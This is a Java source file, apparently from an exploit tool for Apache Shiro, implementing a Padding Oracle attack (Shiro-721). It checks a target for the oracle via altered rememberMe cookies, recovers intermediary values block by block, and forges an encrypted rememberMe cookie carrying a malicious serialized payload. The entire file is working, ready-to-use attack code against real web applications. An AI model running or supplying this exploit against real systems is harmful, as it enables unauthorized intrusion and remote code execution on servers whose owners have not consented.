package com.y5neko.shiroexp.misc;

import com.y5neko.shiroexp.request.shiro721.HttpRequestInfo;
import com.y5neko.shiroexp.misc.exception.ExploitFailedException;
import com.y5neko.shiroexp.request.shiro721.HttpRequest;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.Hex;

/**
 * Padding Oracle 攻击核心类
 * 用于 Shiro 721 漏洞利用
 */
public class PaddingOracle {
    private HttpRequestInfo httpRequestInfo;
    private byte[] payload;
    private AttackProgressCallback callback;
    private volatile boolean cancelled = false;
    private int threadCount = 1;

    /**
     * 进度回调接口
     * 用于向 UI 层报告攻击进度
     */
    public interface AttackProgressCallback {
        /**
         * 漏洞检测开始
         */
        void onVulnCheckStart();

        /**
         * 漏洞检测完成
         * @param vulnerable 是否存在漏洞
         */
        void onVulnCheckComplete(boolean vulnerable);

        /**
         * 块计算开始
         * @param blockNum 当前块编号
         * @param totalBlocks 总块数
         */
        void onBlockStart(int blockNum, int totalBlocks);

        /**
         * 找到中间值
         * @param position 位置（1-16）
         * @param intermediary 中间值
         */
        void onIntermediaryFound(int position, String intermediary);

        /**
         * 生成密文
         * @param cipherText 密文
         */
        void onCipherTextGenerated(String cipherText);

        /**
         * 攻击完成
         * @param result 生成的恶意 Cookie
         */
        void onAttackComplete(String result);

        /**
         * 攻击失败
         * @param error 错误信息
         */
        void onAttackFailed(String error);

        /**
         * 日志输出
         * @param message 日志消息
         */
        void onLogMessage(String message);
    }

    /**
     * 构造函数
     * @param httpRequestInfo HTTP 请求信息
     * @param payload 要加密的 payload（恶意的序列化数据）
     */
    public PaddingOracle(HttpRequestInfo httpRequestInfo, byte[] payload){
        this.httpRequestInfo = httpRequestInfo;
        this.payload = payload;
    }

    /**
     * 设置进度回调
     * @param callback 回调接口
     */
    public void setCallback(AttackProgressCallback callback) {
        this.callback = callback;
    }

    /**
     * 设置线程数
     * @param threadCount 线程数（1-16）
     */
    public void setThreadCount(int threadCount) {
        this.threadCount = Math.max(1, Math.min(16, threadCount));
    }

    /**
     * 取消攻击
     */
    public void cancel() {
        this.cancelled = true;
    }

    /**
     * 检查是否已取消
     * @return 是否已取消
     */
    public boolean isCancelled() {
        return cancelled;
    }

    /**
     * 输出日志
     * @param message 日志消息
     */
    private void log(String message) {
        System.out.println(message);
        if (callback != null) {
            callback.onLogMessage(message);
        }
    }

    /**
     * 获取中间值（通过 Padding Oracle 攻击）
     * @param cipherText 当前密文块
     * @return 中间值的十六进制字符串
     * @throws ExploitFailedException 攻击失败或被取消
     */
    private String getIntermediary(String cipherText) throws ExploitFailedException {
        StringBuffer intermediary = new StringBuffer();

        for(int position = 1; position <= 16; position++){
            if (cancelled) {
                throw new ExploitFailedException("Attack was cancelled by user");
            }

            RoundTask task = new RoundTask(httpRequestInfo, position, cipherText, intermediary, threadCount);
            task.start();

            // 正常情况下，每走一轮 RoundTask，intermediary 的长度应该是增加 2 的
            // 如果某一轮 RoundTask 连续重试 5 次也没有找到有效的值，可能就是上一轮 RoundTask 拿到的结果有误，需要退回到上一轮重试
            if(intermediary.length() == position * 2){
                log("[*] Position " + position + "/16: intermediary = " + intermediary);

                if (callback != null) {
                    callback.onIntermediaryFound(position, intermediary.toString());
                }
            } else {
                log("[*] Position " + position + ": Wrong result detected, retrying...");
                position = ((position - 2) >= 0) ? (position - 2) : 0;
            }
        }

        return intermediary.toString();
    }

    /**
     * 检测目标是否存在 Padding Oracle 漏洞
     * @return 是否存在漏洞
     */
    private boolean hasVuln(){
        if (callback != null) {
            callback.onVulnCheckStart();
        }

        log("[*] Checking if target is vulnerable to Padding Oracle attack...");
        Shiro721Tools.getDeleteMeBaseCount();

        for(int i = 0; i < 256; i++){
            if (cancelled) {
                return false;
            }

            String hex = Integer.toHexString(i);
            if (hex.length() == 1) {
                hex = 0 + hex;
            }

            String testString = httpRequestInfo.getRememberMeCookie() +
                               "00000000000000000000000000000000".substring(2) +
                               hex +
                               "00000000000000000000000000000000";
            byte[] bytes = null;
            try {
                bytes = Hex.decodeHex(testString);
            } catch (DecoderException e) {
                e.printStackTrace();
            }
            String payload = Base64.encodeBase64String(bytes);

            if (HttpRequest.getDeleteMeCount(httpRequestInfo, payload) < Shiro721Tools.deleteMeBaseCount) {
                log("[+] Target is VULNERABLE to Padding Oracle attack!");
                if (callback != null) {
                    callback.onVulnCheckComplete(true);
                }
                return true;
            }
        }

        log("[-] Target is NOT vulnerable to Padding Oracle attack");
        if (callback != null) {
            callback.onVulnCheckComplete(false);
        }
        return false;
    }

    /**
     * 执行 Padding Oracle 攻击，生成恶意 RememberMe Cookie
     * @return Base64 编码的恶意 Cookie
     * @throws ExploitFailedException 攻击失败
     */
    public String encrypt() throws ExploitFailedException {
        try {
            // 1. 检测漏洞
            if(!hasVuln()){
                throw new ExploitFailedException("Target is not vulnerable to Padding Oracle attack");
            }

            // 2. 填充 payload
            padding();

            // 3. 开始攻击
            log("[*] Starting Padding Oracle attack...");
            StringBuffer sb = new StringBuffer();
            log("[*] Set initial cipherText to 00000000000000000000000000000000");
            String cipherText = "00000000000000000000000000000000";
            sb.insert(0, cipherText);

            int totalBlocks = payload.length / 16;
            int currentBlock = totalBlocks;

            log("[*] Total blocks to process: " + totalBlocks);

            // 4. 逐块处理
            for(int i = payload.length; i > 0; i = i - 16){
                if (cancelled) {
                    throw new ExploitFailedException("Attack was cancelled by user");
                }

                byte[] block = new byte[16];
                System.arraycopy(payload, i - 16, block, 0, 16);

                log("[*] Calculating block " + (totalBlocks - currentBlock + 1) + "/" + totalBlocks);

                if (callback != null) {
                    callback.onBlockStart(totalBlocks - currentBlock + 1, totalBlocks);
                }

                // 获取中间值
                String intermediary = getIntermediary(cipherText);
                log("[+] Block " + (totalBlocks - currentBlock + 1) + " intermediary: " + intermediary);

                // 生成密文
                cipherText = Shiro721Tools.xor(intermediary, Hex.encodeHexString(block));
                log("[+] Block " + (totalBlocks - currentBlock + 1) + " cipherText: " + cipherText);

                if (callback != null) {
                    callback.onCipherTextGenerated(cipherText);
                }

                sb.insert(0, cipherText);
                currentBlock--;
            }

            // 5. 编码结果
            byte[] res = new byte[0];
            try {
                res = Hex.decodeHex(sb.toString());
            } catch (DecoderException e) {
                throw new ExploitFailedException("Failed to encode result: " + e.getMessage());
            }

            String finalResult = Base64.encodeBase64String(res);

            log("[+] Attack completed successfully!");
            log("[+] Malicious Cookie length: " + finalResult.length() + " characters");

            if (callback != null) {
                callback.onAttackComplete(finalResult);
            }

            return finalResult;

        } catch (ExploitFailedException e) {
            log("[-] Attack failed: " + e.getMessage());

            if (callback != null) {
                callback.onAttackFailed(e.getMessage());
            }

            throw e;
        }
    }

    /**
     * PKCS#7 填充
     * 将 payload 填充到 16 字节的整数倍
     */
    public void padding() {
        int blockSize = (int) Math.ceil(payload.length / 16.0);
        log("[*] Payload has " + blockSize + " block(s)");
        log("[*] Padding payload to 16-byte boundary");

        int len = payload.length;
        int paddingLen = 0;
        while (len % 16 != 0) {
            len++;
            paddingLen++;
        }

        byte[] padding = new byte[paddingLen];
        for (int i = 0; i < paddingLen; i++) {
            padding[i] = (byte) paddingLen;
        }

        byte[] data = new byte[len];
        System.arraycopy(payload, 0, data, 0, payload.length);
        System.arraycopy(padding, 0, data, payload.length, padding.length);

        this.payload = data;
        log("[*] Padding complete: " + payload.length + " -> " + data.length + " bytes");
    }
}
